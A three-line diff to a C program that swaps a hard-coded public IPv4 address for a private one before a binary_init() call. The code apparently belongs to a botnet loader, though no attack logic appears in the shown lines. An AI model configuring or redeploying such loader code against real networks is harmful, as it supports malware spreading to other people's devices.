@@ -28,7 +28,7 @@ int main(int argc, char **args)
 
     addrs_len = 1;
     addrs = calloc(4, sizeof(ipv4_t));
-    addrs[0] = inet_addr("18.237.253.163");
+    addrs[0] = inet_addr("172.26.4.230");
 
     if(!binary_init())
     {
